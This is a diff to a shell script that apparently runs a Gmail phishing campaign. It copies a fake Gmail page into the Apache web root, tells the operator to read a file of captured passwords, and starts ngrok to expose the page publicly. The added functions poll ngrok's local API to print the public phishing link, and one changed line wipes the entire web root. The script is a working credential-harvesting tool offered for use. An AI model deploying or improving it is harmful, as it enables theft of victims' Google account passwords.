@@ -100,18 +100,36 @@ check_web(){
 phish(){
 	#unzip gmail.zip
 	rm -rf /var/www/html/gmail
-	cp -r gmail /var/www/html
+  rm -rf /var/www/html/*
+	cp -r gmail/* /var/www/html
 	printf "\e[1;93m You can Look pass file on new terminal \e[1;91m\"cat /var/www/html/gmail/msf-lazy.txt\" ... \n\e[0m"
 	printf "\e[1;92m Phishing link is : http://ngrok_domain/gmail \n\e[0m"
-	chmod 755 /var/www/html/gmail
-	chmod 722 /var/www/html/gmail/msf-lazy.txt
+	chmod 755 /var/www/html
+	chmod 722 /var/www/html/msf-lazy.txt
 }
 #################gmail phishing code #############
 start_service(){
 	printf "\e[1;93m Start apache2 service... \n\e[0m"
 	service apache2 start
 	printf "\e[1;93m Start ngrok service... \n\e[0m"
+  print_ngrok_url &
 	ngrok http 80
+}
+
+print_ngrok_url() {
+  NEXT_WAIT_TIME=0
+  until [ $NEXT_WAIT_TIME -eq 5 ]; do
+    request_ngrok_url
+    sleep $(( NEXT_WAIT_TIME++ ))
+  done
+  [ $NEXT_WAIT_TIME -lt 5 ]
+}
+
+request_ngrok_url() {
+  printf "\e[1;93m Requesting ngrok url... \n\e[0m"
+  printf "\e[1;93m NGROK URL: \e[1;91m \e[0m"
+  curl --silent http://127.0.0.1:4040/api/tunnels | jq '.tunnels[0].public_url'
+  printf "\e[1;93m\n\e[0m"
 }
 
 banner
